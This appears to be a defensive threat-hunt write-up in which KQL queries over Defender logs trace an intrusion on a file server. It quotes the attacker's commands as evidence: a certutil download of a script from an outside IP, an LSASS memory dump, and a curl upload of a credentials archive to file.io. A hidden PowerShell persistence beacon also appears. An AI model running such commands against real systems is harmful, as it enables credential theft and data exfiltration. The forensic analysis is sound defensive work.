# Scenario
### INCIDENT BRIEF

SITUATION: After establishing initial access on November 19th, network monitoring detected the attacker returning approximately 72 hours later. Suspicious lateral movement and large data transfers were observed overnight on the file server.

COMPROMISED SYSTEMS: [REDACTED - Investigation Required]

EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs

### Investigation
---
# Flag 1: INITIAL ACCESS - Return Connection Source
The query used is to identify **remote successful login activity** and determine:

- **Which account** logged in  
- **From what IP or machine**  
- **At what time**  
- **To which host**
  
Query Used:
```
DeviceLogonEvents
| where DeviceName contains "azuki-sl"
| where ActionType contains "success"
| where RemoteIP != ""
| project Timestamp, DeviceName, AccountName, RemoteIP, ActionType, RemoteDeviceName

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A3.png)

Question: Identify the source IP address of the return connection?

```
159.26.106.98
```
# Flag 2: LATERAL MOVEMENT - Compromised Device
The purpose of using this query is to:

- Identify remote logon activity on devices containing the name **"azuki"**
- Focus on events that occurred **after a specific suspicious timestamp**
- Track where logins originated from using the **RemoteIP** field
- Reconstruct the attacker timeline by sorting logon events **chronologically** in ascending order. 

  Query Used:
  ```
  DeviceLogonEvents
  | where DeviceName contains "azuki"
  | where Timestamp > datetime(2025-11-22T00:27:53.7487323Z)
  | where RemoteIP != ""
  | order by Timestamp asc
  ```
  Result:
  
  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A5.png)

  Question: Identify the compromised file server device name?
  ```
  azuki-fileserver01
  ```

 # FLAG 3: LATERAL MOVEMENT - Compromised Account

 The query used is the same as the one in flag 2. Under AccountName 
 
  Result:
  
  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A5.png)


 Question: Identify the compromised administrator account?

 ```
  fileadmin
 ```
 

 # FLAG 4: DISCOVERY - Share Enumeration Command

 The used query helps identify share-related activity performed by the fileadmin account on the file server, which may indicate:

  - Legitimate file administration

  - Reconnaissance of network shares

  - Lateral movement preparation

  - Data staging or exfiltration activity

 Query 1: 
 
 ```
 DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == @"fileadmin"
| where ProcessCommandLine contains "share"

 ```

Query 2:
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == @"fileadmin"
| where ProcessCommandLine contains "share"
| where FileName contains "net"
```

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/134a318a1d5fb6a8dbf79fbc59c3c6007ae5c3eb/Images/Azuki-Images/A40.png)


Question: Identify the command used to enumerate local network shares?

```
"net.exe" share
```

# FLAG 5: DISCOVERY - Remote Share Enumeration

The  query used identifies instances where net.exe was run on azuki-fileserver01 with command-line arguments that reference paths or network shares.

  - Network share enumeration

  - Lateral movement reconnaissance

  - File share access or staging activity

  Query Used:

  ```
   DeviceProcessEvents
   | where DeviceName == "azuki-fileserver01"
   | where ProcessCommandLine contains "\\"
   | where FileName contains "net.exe"
  ```
  Result:

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A9.png)

  Question: Identify the command used to enumerate remote shares? 

  ```
  "net.exe" view \\10.1.0.188
  ```

  #  FLAG 6: DISCOVERY - Privilege Enumeration

  Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.

  The query is used to indicate user or privilege discovery activity, as whoami is commonly used to identify:

  - The current user account

  - Group memberships

  - Privilege level

  Query Used:

  ```
  DeviceProcessEvents
  | where DeviceName == "azuki-fileserver01"
  | where ProcessCommandLine contains "whoami.exe"
  ```
  Result:

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A11.png)

  Question: Identify the command used to enumerate user privileges?

  ```
   "whoami.exe" /all
  ```
  
  # FLAG 7: DISCOVERY - Network Configuration Command
  
  Network configuration enumeration helps attackers understand the target environment, identify domain membership, and discover additional network segments.

  The query used searches process execution events on the device azuki-fileserver01 and identifies instances where ipconfig.exe was executed.

  ipconfig.exe is commonly used to gather network configuration information, such as IP addresses, DNS servers, and network interfaces. Its execution often indicates network   discovery activity following access to a system.

  MITRE ATT&CK Mapping

  - Tactic: Discovery (TA0007)
  - Technique: T1016 – Network Configuration Discovery

  Query Used: 
  
  ```
  DeviceProcessEvents
  | where DeviceName == "azuki-fileserver01"
  | where ProcessCommandLine contains "ipconfig.exe"
  ```
  Result:

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A13.png)


  #  FLAG 8: DEFENSE EVASION - Directory Hiding Command
  
  Modifying file system attributes to hide directories prevents casual discovery by users and some security tools. 
  
  attrib.exe is a native Windows utility used to view or modify file attributes (e.g., hidden, system, read-only). Attackers commonly use it to hide malicious files or         scripts by setting the Hidden or System attributes to reduce visibility.
  
  MITRE ATT&CK Mapping

  - Tactic: Defense Evasion (TA0005)

  - Technique: T1564.001 – Hide Artifacts: Hidden Files and Directories

  Query Used: 

  ```
  DeviceProcessEvents
  | where DeviceName == "azuki-fileserver01"
  | where ProcessCommandLine contains "attrib.exe"
  ```

  Result: 

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A15.png)


  Question: Identify the command used to hide the staging directory?

  ```
  "attrib.exe" +h +s C:\Windows\Logs\CBS
  ```

  # FLAG 9: COLLECTION - Staging Directory Path
  
  Attackers establish staging locations to organise tools and stolen data before exfiltration. This directory path is a critical IOC.

  From the previous query, Drive C was the location where the data was collected.

  MITRE ATT&CK Mapping
  - Tactic: Collection (TA0009)
  - Technique: T1074.001 – Data Staged: Local Data Staging

  Question: Identify the data staging directory path?

  ```
  C:\Windows\Logs\CBS
  ```

  # FLAG 10: DEFENSE EVASION - Script Download Command

  Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.

  The query used  does an analysis on the process execution activity on the device azuki-fileserver01 and looks for processes whose command line includes:

  - http → often indicates direct network communication, downloads, or uploads

  - certutil.exe → a legitimate Windows utility commonly abused by attackers to:
    - Download files from the internet
    - Decode payloads
    - Exfiltrate data

The query then projects key investigation fields to help identify:

  - When the activity occurred (Timestamp)

  - Which host it happened on (DeviceName)

  - What binary was executed (FileName)

  - The full command used (ProcessCommandLine)

  - Which user ran it (AccountName)

MITRE ATT&CK Mapping

Primary Technique

T1105 – Ingress Tool Transfer
  - Downloading tools or payloads from an external system

Living‑off‑the‑Land Binary (LOLBin)

  - T1218 – System Binary Proxy Execution

  - Specifically applies to certutil.exe

Query Used:
  ```
  DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "http"
    or ProcessCommandLine contains "certutil.exe"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
  ```
Result:

 ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A19.png)

 Question: Identify the command used to download the PowerShell script?

```
"certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
```

# FLAG 11: COLLECTION - Credential File Discovery

Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.

This query searches file creation events on the device azuki-fileserver01 and identifies cases where:

  - Files were created under C:\Windows\Logs\CBS (a system directory often abused for stealth)

  - The file name contains .csv

  - The action was file creation

  - The activity was performed by the fileadmin account

MITRE ATT&CK Mapping

  - T1074.001 – Data Staged: Local Data Staging
    - Collected data stored locally before exfiltration

  - T1005 – Data from Local System
    - Data collected directly from the compromised system

  - T1552 – Unsecured Credentials
    - Attackers access credentials stored in plaintext or insecure locations, such as:
      - Files (CSV, TXT, XML)
      - Scripts
      - Configuration files
      - Logs

Query Used:

```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where FolderPath contains @"C:\Windows\Logs\CBS"
| where InitiatingProcessAccountName == @"fileadmin"
| where FileName contains ".csv"
| where ActionType == "FileCreated"
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A22.png)

Question: What credential file was created in the staging directory?

```
IT-Admin-Passwords.csv
```

# FLAG 12: COLLECTION - Recursive Copy Command

Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals the attacker's methodology.

This query analyzes process execution activity on the host azuki-fileserver01 to identify commands that may indicate data movement or exfiltration preparation.

Specifically, it:

Monitors processes whose command line contains:

  - http → possible web-based communication or data transfer

  - xcopy → file copying, often used for staging data

Displays:

  - When the command ran

  - Which account executed it

  - The executable name

  - The full command line

  - Orders events chronologically, helping reconstruct attacker activity over time

MITRE ATT&CK Mapping

  - T1074.001 – Data Staged: Local Data Staging
    - Use of xcopy to gather and prepare files locally

  - T1041 – Exfiltration Over C2 Channel
    - Use of HTTP-based commands to transfer data externally

  - T1059 – Command and Scripting Interpreter
    - Execution of native Windows utilities, e.g., using cmd.exe, powershell.exe
  
  - T1119 - Automated Collection
    - Adversaries may automate the collection of data of interest on the system to reduce the need for manual activity and speed up exfiltration

Query Used: 

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "http"
   or ProcessCommandLine contains "xcopy"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A23.png)

Question: What command was used to stage data from a network share?

```
"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
```

# FLAG 13: COLLECTION - Compression Command

Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.

This query examines process execution activity on the host azuki-fileserver01 and identifies commands executed by the fileadmin account where the command line contains it-admin.

It helps detect:

  - Possible privilege misuse or impersonation

  - Attempts to access or reference administrative resources

  - Suspicious activity where a privileged account interacts with another admin‑related identifier

This is useful for spotting lateral movement preparation or reconnaissance involving admin accounts.

MITRE ATT&CK Mapping

  - T1560 – Archive Collected Data
    - Adversaries may compress or archive collected data into a single file (e.g., ZIP, TAR, RAR) to:
      - Simplify exfiltration
      - Reduce detection footprint
      - Stage multiple files together

Query Used: 

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == @"fileadmin"
| where ProcessCommandLine contains "it-admin"
```

Result: 

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A25.png)


![image alt](https://github.com/Muts256/SNC-Public/blob/d527450ec34c0392a88f2c40bdf901b09f7462c1/Images/Azuki-Images/A41.png)

Question: What command was used to compress the staged collection data?

```
"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin
```

# FLAG 14: CREDENTIAL ACCESS - Renamed Tool

Renaming credential dumping tools is a basic OPSEC practice to evade signature-based detection.

The query used looks for file-related activity on the host azuki-fileserver01, where:

  - The file operation occurred in C:\Windows\Logs\CBS, a Windows system log directory

  - The activity was initiated by the fileadmin account

  - The file name contains exe, indicating an executable file

This helps detect executables being written, modified, or accessed in a directory that normally should not contain executables, which may indicate malware staging or persistence preparation.


MITRE ATT&CK Mapping

  - T1036 – Masquerading
    - Malicious executables hidden in legitimate Windows directories
  - T1105 – Ingress Tool Transfer
    - Executables introduced onto the system
 
Query Used: 

```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where FolderPath contains @"C:\Windows\Logs\CBS"
| where InitiatingProcessAccountName == @"fileadmin"
| where FileName contains "exe"
| project Timestamp, ActionType, FileName, FolderPath
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/1083e1870e8f18faaafddc6a88e0799a5f220caa/Images/Azuki-Images/A42.png)

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A26.png)

Question: What was the renamed credential dumping tool?

```
pd.exe
```

#  FLAG 15: CREDENTIAL ACCESS - Memory Dump Command

The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.

The query used searches process execution events where the executable was launched from the directory.
This directory is normally used for Windows component servicing logs, not for running executables. Seeing processes execute from this path is highly suspicious and often indicates malware hiding in trusted system locations.

MITRE ATT&CK Mapping 

T1003.001 – OS Credential Dumping: LSASS Memory
  -Adversaries dump the memory of the LSASS process to obtain credentials

The presence of lsass.dmp indicates that the attacker:

  - Accessed LSASS process memory

  - Created a memory dump containing credentials

Intended to extract:

  - Password hashes

  - Kerberos tickets

  - Clear-text credentials

Query Used:

```
DeviceProcessEvents
| where FolderPath contains "C:\\Windows\\logs\\CBS"
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A29.png)

Question: What command was used to dump process memory for credential extraction?

```
 "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
```
#  FLAG 16: EXFILTRATION - Upload Command

Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.

The query used inspects process execution events on azuki-fileserver01 to identify commands that involve HTTP communication or explicitly use curl.

Specifically, it:

Detects processes whose command line contains:

  - http → possible web communication or data transfer

  - curl → a common tool for HTTP requests and file uploads

Shows:

  - Execution time

  - Device name

  - User account that ran the command

  - Executable name

- Full command line

- Sorts results chronologically, helping reconstruct attacker activity

MITRE ATT&CK Mapping

  - T1041 – Exfiltration Over C2 Channel
    - Use of HTTP to exfiltrate data

  - T1105 – Ingress Tool Transfer (if curl is used to download tools)
    - Files transferred via web protocols

  - T1059 – Command and Scripting Interpreter
    - Execution of native tools via command line

  - T1071.001 – Application Layer Protocol: Web Protocols
    - Use of HTTP/HTTPS for communication
  
Query Used:

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "http"
   or ProcessCommandLine contains "curl"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine

```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A31.png)

Question: What command was used to exfiltrate the staged data?
```
"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
```

# FLAG 17: EXFILTRATION - Cloud Service

Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.
Observed from the previous command where an archived credentials file is uploaded to a location https://file.io. The https://file.io aligns with characteristics of file.io, which is a public, cloud-based file-sharing service designed for quick, anonymous uploads and downloads.

These services are favoured by attackers because
  - Anonymous & No Authentication: No account or credentials required, anyone can upload files, ideal for avoiding attribution
  - One-Time / Short-Lived Downloads: Files are often deleted after the first download or after a short time, reducing forensic evidence and making post-incident retrieval difficult
  - HTTPS-Based: Uses encrypted HTTPS, Payload contents are hidden from network inspection, Blends in with normal web traffic.

MITRE ATT&CK Mapping

  - T1567.002 – Exfiltration to Cloud Storage
    - Uploading data to a public file-sharing service

  - T1041 – Exfiltration Over C2 Channel
    - Data sent over HTTPS

  - T1560 – Archive Collected Data
    - Credentials were compressed before exfiltration

  - T1074.001 – Data Staged: Local
    - Data stored locally prior to upload

  - T1059 – Command-Line Execution
    - Abuse of native CLI tools

  Query used:
  ```
  DeviceNetworkEvents
  | where RemoteIP == "172.67.156.251"
  | project Timestamp, DeviceName, ActionType, RemoteUrl, InitiatingProcessCommandLine
  ```
  Result:

  ![image alt](https://github.com/Muts256/SNC-Public/blob/be46a7200132a8c4551ff8ef595966d1e9d83d9d/Images/Azuki-Images/A43.png)

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A31.png)

  Question: What cloud service was used for data exfiltration?

  ```
  file.io
  ```

# FLAG 18: PERSISTENCE - Registry Value Name

Registry autorun keys provide reliable persistence that executes on every system startup or user logon.

The query used monitors Windows registry activity on azuki-fileserver01 and identifies changes to common autorun registry locations.

Specifically, it:

  - Watches the following startup persistence keys:

    - Run

    - RunOnce

  - Under both HKLM (system-wide) and HKCU (user-specific)

  - Captures:

    - When the registry change occurred

    - Which key and value were modified

    - The data being executed at startup

    - Which process made the change

  - Orders results newest to oldest, making recent persistence activity easy to spot

MITRE ATT&CK Mapping

  - T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

  - T1036 – Masquerading
    - If malicious payloads mimic legitimate system names or paths

  - T1059 – Command and Scripting Interpreter
    - If scripts (PowerShell, CMD) are executed at startup

  Query Used: 
  ```
  DeviceRegistryEvents
  | where DeviceName contains "azuki-fileserver01"
  | where RegistryKey startswith @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
     or RegistryKey startswith @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
     or RegistryKey startswith @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
     or RegistryKey startswith @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
  | project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueType, RegistryValueData, InitiatingProcessFileName
  | order by Timestamp desc
  ```
  Result

  ![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A35.png)

Question: What registry value name was used to establish persistence?

```
 FileShareSync
```

# FLAG 19: PERSISTENCE - Beacon Filename

Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion.

Using the same query as the above,  notice a command that is hiding some activities

![image alt](https://github.com/Muts256/SNC-Public/blob/eb1cc4a8350707de345b8217c7549decba7911a2/Images/Azuki-Images/A45.png)

This command is executing a PowerShell script in a stealthy manner, and in most environments, it is highly suspicious.

Suspicious activity includes:
  - NoP: Prevents loading the user’s PowerShell profile, makes execution faster and quieter.
  - W Hidden: Hides the PowerShell window, preventing the user from seeing the script execution, a strong indicator of stealthy execution
  - File C:\Windows\System32\svchost.ps1: Executes a PowerShell script named svchost.ps1, svchost mimics a legitimate Windows binary
  
MITRE ATT&CK Mapping

  - T1059.001 – Command and Scripting Interpreter: PowerShell

  - T1036 – Masquerading

  - T1564.003 – Hide Artifacts: Hidden Window

  - T1027 – Obfuscated / Stealthy Execution 

Result: 

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A37.png)

Question: What is the persistence beacon filename?

```
svchost.ps1
```

# FLAG 20: ANTI-FORENSICS - History File Deletion

PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

The query used identifies text files (.txt) that were deleted on the device azuki-fileserver01, specifically within user profile directories.

It helps:

  - Detect deletion of user-owned text files

  - Identify potential evidence removal or cleanup activity

  - See when and where files were deleted

  - Review activity in reverse chronological order (most recent first)


MITRE ATT&CK Mapping

  - T1070.004 – Indicator Removal on Host: File Deletion

    - Deleting files to remove forensic evidence

    - Common during post-exploitation cleanup

  - T1565.001 – Stored Data Manipulation
    - If legitimate data is destroyed to impact availability

  - T1005 – Data from Local System
    - If files were accessed before deletion

Query Used: 
```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName endswith ".txt"
| where FolderPath contains "Users"
| project Timestamp, DeviceName, FileName, FolderPath
| order by Timestamp desc
```
Result

![image alt](https://github.com/Muts256/SNC-Public/blob/646800307d7cb6572de3afa3334c7bb6efa759bf/Images/Azuki-Images/A39.png)


Question: What PowerShell history file was deleted?

```
ConsoleHost_history.txt
```
## Threat Hunt Finding:

During this threat hunting exercise on `azuki-fileserver01` and related endpoints, multiple indicators of compromise and malicious behaviors were identified:

1. **Persistence and Masquerading:**  
   The attacker established persistence via registry Run keys (e.g., `FileShareSync`) and executed a PowerShell script (`svchost.ps1`) from a system directory using hidden windows. This demonstrates classic boot/logon autostart execution and masquerading (T1547.001, T1036).

2. **Credential Theft:**  
   LSASS memory dumps (`lsass.dmp`) were created, indicating credential dumping activity (T1003.001). This represents a significant risk of lateral movement and privilege escalation.

3. **Data Staging and Exfiltration:**  
   Data was compressed (`tar.exe`) and exfiltrated via `curl.exe` to a public cloud service (`file.io`), reflecting staging and exfiltration to cloud storage (T1560, T1567.002).

4. **Command Execution and Lateral Movement:**  
   Suspicious commands, including `whoami.exe`, `ipconfig.exe`, `xcopy.exe`, and HTTP-based connections, were executed under the compromised account `fileadmin`, indicating reconnaissance and potential lateral movement (T1059, T1071).

5. **Evidence Removal:**
   File deletions targeting `.txt` files in user directories were observed, suggesting an attempt to remove artifacts and evade detection (T1070.004).

# Recommendation

   - *Harden and Monitor PowerShell Usage:*
     PowerShell was used for stealthy execution (-NoProfile -WindowStyle Hidden) and persistence via a malicious script masquerading as a Windows binary.
       - Enforce PowerShell Constrained Language Mode for non-admin users
       - Enable PowerShell Script Block Logging (Event ID 4104)
       - Monitor for suspicious flags: -NoP, -W Hidden, -EncodedCommand
       - Alert on PowerShell execution from non-standard locations e.g. C:\Windows\System32\svchost.ps1

  - *Strengthen Persistence Detection and Controls:*
      The attacker used registry Run keys (FileShareSync) to ensure execution at startup.
      - Alert on new or modified Run / RunOnce registry keys
      - Baseline known-good autorun entries.
      - Block registry persistence creation by non-admin users
      - Regularly audit of HKLM\...\Run and HKCU\...\Run

  - *Restrict Data Staging, Compression, and Exfiltration Tools:*
      Data was staged, compressed using tar.exe, and exfiltrated via curl.exe to a public cloud service (file.io).
      - Restrict or alert on: tar.exe, curl.exe, certutil.exe, xcopy.exe
      - Monitor non-standard compression paths e.g. C:\Windows\Logs\CBS
      - Block outbound connections to: Anonymous file-sharing services
      - Use Defender for Endpoint indicators to block known exfil domains

  - *Protect Credentials and Monitor for Dump Artifacts:*
      The presence of lsass.dmp strongly indicates credential dumping.
      - Enable LSASS protection - RunAsPPL
      - Disable local admin access where unnecessary
      - Alert on: Creation of .dmp files related to LSASS, Access to LSASS memory
      - Enforce Credential Guard where possible
 
  - *Detect and Prevent Evidence Removal & Defense Evasion:*
      Attackers deleted .txt files and PowerShell history to erase evidence.
      - Monitor file deletion events in user directories
      - Alert on: Deletion of shell history files, Cleanup shortly after suspicious activity
      - Retain endpoint logs centrally with tamper protection
      - Correlate deletion events with preceding command execution





































